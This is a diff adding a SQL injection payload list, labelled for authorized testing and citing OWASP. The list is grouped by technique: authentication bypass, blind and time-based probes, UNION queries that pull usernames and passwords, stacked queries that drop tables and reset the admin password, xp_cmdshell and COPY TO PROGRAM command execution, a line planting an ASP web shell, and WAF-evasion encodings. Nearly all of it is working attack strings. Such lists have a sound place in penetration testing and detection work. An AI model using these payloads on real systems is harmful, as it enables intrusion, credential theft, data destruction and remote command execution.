@@ -1,0 +1,128 @@
+# SQL Injection Payloads
+# For authorized security testing only
+# Source: OWASP Testing Guide, custom research
+#
+# Categories:
+#   [AUTH]   - Authentication bypass
+#   [ERROR]  - Error-based detection
+#   [BLIND]  - Blind/boolean-based
+#   [TIME]   - Time-based blind
+#   [UNION]  - UNION-based extraction
+#   [STACKED]- Stacked queries
+#   [OOB]    - Out-of-band
+
+# ─── AUTHENTICATION BYPASS ────────────────────────────────────────
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+') OR ('1'='1
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+1' OR '1' = '1
+1 OR 1=1
+' OR ''='
+"OR 1=1--
+"OR "1"="1
+') OR 1=1--
+') OR ('1'='1'--
+
+# ─── ERROR-BASED DETECTION ────────────────────────────────────────
+'
+''
+`
+')
+")
+'))
+"))
+\
+%%
+%'
+%"
+;--
+;#
+'--
+"--
+' AND SLEEP(0)--
+1; SELECT 1
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+
+# ─── BOOLEAN-BASED BLIND ──────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' AND SUBSTRING(username,1,1)='a'--
+' AND ASCII(SUBSTRING(username,1,1))>64--
+' AND ASCII(SUBSTRING(username,1,1))<91--
+' AND (SELECT COUNT(*) FROM users)>0--
+1' AND (SELECT 1 FROM users LIMIT 1)='1
+
+# ─── TIME-BASED BLIND ─────────────────────────────────────────────
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+1; SELECT SLEEP(5)
+'); WAITFOR DELAY '0:0:5'--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--
+1 UNION SELECT SLEEP(5)--
+' OR BENCHMARK(5000000,MD5(1))--
+'; SELECT pg_sleep(5)--
+
+# ─── UNION-BASED EXTRACTION ───────────────────────────────────────
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password FROM users--
+
+# ─── STACKED QUERIES ──────────────────────────────────────────────
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_makewebtask 'c:\inetpub\wwwroot\shell.asp','SELECT ''<% execute(request("cmd")) %>'''--
+
+# ─── WAF BYPASS VARIATIONS ────────────────────────────────────────
+' /*!50000OR*/ '1'='1
+'/**/OR/**/'1'='1
+' %6FR '1'='1
+%27+OR+%271%27%3D%271
+' OR 0x313d31--
+' OR char(49)=char(49)--
+'%20OR%20'1'%3D'1
+'+OR+'1'%3D'1
+' oR '1'='1
+' Or '1'='1
+' OR+1+--+
+1;%00SELECT%201
+
+# ─── DATABASE-SPECIFIC ────────────────────────────────────────────
+# MySQL
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# MSSQL
+' AND 1=CONVERT(int,@@version)--
+'; EXEC xp_cmdshell('net user')--
+' AND 1=1; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+
+# PostgreSQL
+' AND 1=CAST(version() AS int)--
+'; SELECT COPY (SELECT '') TO PROGRAM 'id'--
+'; CREATE TABLE cmd_exec(cmd_output text)--
+
+# Oracle
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
+' UNION SELECT NULL FROM dual--
